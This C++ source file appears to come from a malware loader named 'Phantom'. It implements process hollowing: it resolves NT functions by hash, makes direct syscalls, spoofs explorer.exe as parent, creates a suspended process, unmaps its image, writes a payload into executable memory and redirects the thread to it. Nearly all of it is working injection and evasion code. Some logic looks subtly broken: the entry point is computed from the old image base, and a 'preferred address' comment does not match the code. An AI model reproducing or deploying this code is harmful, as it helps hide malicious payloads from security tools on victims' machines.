#include "ProcessHollowing.h"
#include "util.h"
#include <stdexcept>
#include <tlhelp32.h>
#include <vector>

// KORREKTUR: Typdefinitionen für die benötigten Funktionen
using NtQueryInformationProcess_t = NTSTATUS(WINAPI*)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
using NtUnmapViewOfSection_t = NTSTATUS(WINAPI*)(HANDLE, PVOID);

// KORREKTUR: Hashes ohne inkonsistente Suffixe
constexpr DWORD ntAllocateVirtualMemory_hash = Phantom::Util::a_hash("NtAllocateVirtualMemory");
constexpr DWORD ntWriteVirtualMemory_hash = Phantom::Util::a_hash("NtWriteVirtualMemory");
constexpr DWORD ntCreateThreadEx_hash = Phantom::Util::a_hash("NtCreateThreadEx");
constexpr DWORD ntUnmapViewOfSection_hash = Phantom::Util::a_hash("NtUnmapViewOfSection");
constexpr DWORD ntQueryInformationProcess_hash = Phantom::Util::a_hash("NtQueryInformationProcess");
constexpr DWORD ntGetContextThread_hash = Phantom::Util::a_hash("NtGetContextThread");
constexpr DWORD ntSetContextThread_hash = Phantom::Util::a_hash("NtSetContextThread");

// --- Globale Instanzen für den Assembly-Zugriff ---
// KORREKTUR: Globale Instanzen für ALLE Syscalls deklarieren
SyscallData g_sNtAllocateVirtualMemory;
SyscallData g_sNtWriteVirtualMemory;
SyscallData g_sNtCreateThreadEx;
SyscallData g_sNtUnmapViewOfSection;
SyscallData g_sNtQueryInformationProcess;
SyscallData g_sNtGetContextThread;
SyscallData g_sNtSetContextThread;

// KORREKTUR: Deklarationen für die Syscall-Trampoline.
// Die Implementierung befindet sich jetzt in syscall_stub.asm.
extern "C" {
    NTSTATUS SyscallNtAllocateVirtualMemory(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
    NTSTATUS SyscallNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
    NTSTATUS SyscallNtCreateThreadEx(PHANDLE, ACCESS_MASK, LPVOID, HANDLE, LPTHREAD_START_ROUTINE, LPVOID, BOOL, ULONG, ULONG, ULONG, LPVOID);
    NTSTATUS SyscallNtUnmapViewOfSection(HANDLE, PVOID);
    NTSTATUS SyscallNtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    NTSTATUS SyscallNtGetContextThread(HANDLE, PCONTEXT);
    NTSTATUS SyscallNtSetContextThread(HANDLE, PCONTEXT);
}

ProcessHollowing::ProcessHollowing(HMODULE hNtdllParam) : hNtdll(hNtdllParam) {
    if (!hNtdll || !resolveSyscalls()) {
        throw std::runtime_error("Failed to initialize ProcessHollowing technique.");
    }
}

ProcessHollowing::~ProcessHollowing() {}

bool ProcessHollowing::resolveSyscalls() {
    // KORREKTUR: Das Makro extrahiert jetzt nur noch die Syscall ID.
    #define EXTRACT_SYSCALL(name, pFunc) \
        if (pFunc) { \
            g_s##name.syscall_id = *((DWORD*)((BYTE*)pFunc + 4)); \
        }

    PVOID pNtAllocate = Phantom::Util::getProcAddressByHash(hNtdll, ntAllocateVirtualMemory_hash);
    PVOID pNtWrite = Phantom::Util::getProcAddressByHash(hNtdll, ntWriteVirtualMemory_hash);
    PVOID pNtCreate = Phantom::Util::getProcAddressByHash(hNtdll, ntCreateThreadEx_hash);
    PVOID pNtUnmap = Phantom::Util::getProcAddressByHash(hNtdll, ntUnmapViewOfSection_hash);
    PVOID pNtQuery = Phantom::Util::getProcAddressByHash(hNtdll, ntQueryInformationProcess_hash);
    PVOID pNtGetContext = Phantom::Util::getProcAddressByHash(hNtdll, ntGetContextThread_hash);
    PVOID pNtSetContext = Phantom::Util::getProcAddressByHash(hNtdll, ntSetContextThread_hash);

    if (!pNtAllocate || !pNtWrite || !pNtCreate || !pNtUnmap || !pNtQuery || !pNtGetContext || !pNtSetContext) return false;

    EXTRACT_SYSCALL(NtAllocateVirtualMemory, pNtAllocate);
    EXTRACT_SYSCALL(NtWriteVirtualMemory, pNtWrite);
    EXTRACT_SYSCALL(NtCreateThreadEx, pNtCreate);
    EXTRACT_SYSCALL(NtUnmapViewOfSection, pNtUnmap);
    EXTRACT_SYSCALL(NtQueryInformationProcess, pNtQuery);
    EXTRACT_SYSCALL(NtGetContextThread, pNtGetContext);
    EXTRACT_SYSCALL(NtSetContextThread, pNtSetContext);
    
    return true;
}

InjectionResult ProcessHollowing::inject(
    const std::string& processName,
    const std::vector<unsigned char>& payloadBundle,
    size_t codeOffset)
{
    DWORD parentPid = Phantom::Util::getProcessIdByName("explorer.exe");
    if (parentPid == 0) return InjectionResult::PROCESS_CREATION_FAILED; 

    HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
    if (!hParentProcess) return InjectionResult::PROCESS_CREATION_FAILED;

    STARTUPINFOEXA siEx = { 0 };
    siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    SIZE_T attributeSize;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attributeSize);
    UpdateProcThreadAttribute(siEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
    PROCESS_INFORMATION pi = {};
    
    if (!CreateProcessA(NULL, (LPSTR)processName.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &siEx.StartupInfo, &pi)) {
        DeleteProcThreadAttributeList(siEx.lpAttributeList);
        HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
        CloseHandle(hParentProcess);
        return InjectionResult::PROCESS_CREATION_FAILED;
    }

    DeleteProcThreadAttributeList(siEx.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
    CloseHandle(hParentProcess);
    
    // KORREKTUR: Verwende die Syscall-Version von NtQueryInformationProcess
    PROCESS_BASIC_INFORMATION pbi;
    if (SyscallNtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL) != 0) {
        ResumeThread(pi.hThread);
        TerminateProcess(pi.hProcess, 1);
        return InjectionResult::INJECTION_FAILED;
    }
    
    // 2. Lese die ImageBaseAddress aus der PEB
    PVOID remoteImageBase;
    ReadProcessMemory(pi.hProcess, (PVOID)((char*)pbi.PebBaseAddress + 0x10), &remoteImageBase, sizeof(PVOID), NULL);

    // KORREKTUR: Verwende die Syscall-Version von NtUnmapViewOfSection
    SyscallNtUnmapViewOfSection(pi.hProcess, remoteImageBase);
    
    // 4. Alloziiere neuen Speicher für unsere Payload an der bevorzugten Adresse des alten Images
    PVOID newImageBase = nullptr;
    SIZE_T payloadSize = payloadBundle.size();
    if (SyscallNtAllocateVirtualMemory(pi.hProcess, &newImageBase, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != 0) {
        // Fallback: Alloziiere irgendwo Speicher, falls die bevorzugte Adresse nicht verfügbar ist
        newImageBase = nullptr;
        if (SyscallNtAllocateVirtualMemory(pi.hProcess, &newImageBase, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) != 0) {
            ResumeThread(pi.hThread);
            TerminateProcess(pi.hProcess, 1);
            return InjectionResult::MEMORY_ALLOCATION_FAILED;
        }
    }

    // 5. Schreibe das gesamte Payload-Bundle in den neuen Speicherbereich
    if (SyscallNtWriteVirtualMemory(pi.hProcess, newImageBase, (PVOID)payloadBundle.data(), payloadBundle.size(), NULL) != 0) {
        VirtualFreeEx(pi.hProcess, newImageBase, 0, MEM_RELEASE);
        ResumeThread(pi.hThread);
        TerminateProcess(pi.hProcess, 1);
        return InjectionResult::MEMORY_WRITE_FAILED;
    }

    // 5. Entry Point anpassen (KORREKTUR)
    // Parse die PE-Header des Payloads, um den Entry Point zu finden.
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)payloadBundle.data();
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pDosHeader + pDosHeader->e_lfanew);
    PVOID entryPoint = (PVOID)((BYTE*)remoteImageBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);

    // Hole den Thread-Kontext
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_CONTROL;
    if (SyscallNtGetContextThread(pi.hThread, &ctx) != 0)
    {
        // Fehlerbehandlung
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED;
    }
    
    ctx.Rip = (DWORD64)entryPoint;
    if (SyscallNtSetContextThread(pi.hThread, &ctx) != 0)
    {
        // Fehlerbehandlung
        TerminateProcess(pi.hProcess, 1);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return InjectionResult::INJECTION_FAILED;
    }

    // 6. Thread fortsetzen und Handles schließen
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return InjectionResult::SUCCESS;
}

// KORREKTUR: Entferne den alten Inline-Assembly-Block.
/*
__asm__(
    // ... alter Code ...
);
*/ 